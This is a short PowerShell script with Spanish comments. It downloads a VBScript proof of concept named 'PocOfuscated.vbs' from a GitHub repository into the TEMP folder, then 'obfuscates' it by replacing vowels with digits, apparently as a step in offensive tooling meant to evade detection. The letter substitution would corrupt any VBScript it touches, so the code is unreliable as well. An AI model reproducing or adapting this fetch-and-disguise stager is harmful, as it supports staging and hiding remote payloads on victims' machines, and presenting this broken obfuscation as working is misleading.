# Definir la URL del archivo y la ruta de destino
$url = "https://raw.githubusercontent.com/Jabato96/POCAHK/main/PocOfuscated.vbs"
$destinationPath = "$env:TEMP\PocOfuscated.vbs"

# Descargar el archivo
Invoke-WebRequest -Uri $url -OutFile $destinationPath

# Leer el contenido del archivo descargado
$content = Get-Content -Path $destinationPath

# Ofuscación simple: reemplazar ciertas letras por números (ejemplo)
$ofuscatedContent = $content -replace "a", "4" -replace "e", "3" -replace "i", "1" -replace "o", "0" -replace "u", "ü"

# Guardar el contenido ofuscado de nuevo en el archivo
Set-Content -Path $destinationPath -Value $ofuscatedContent

Write-Host "Archivo descargado y ofuscado guardado en $destinationPath"
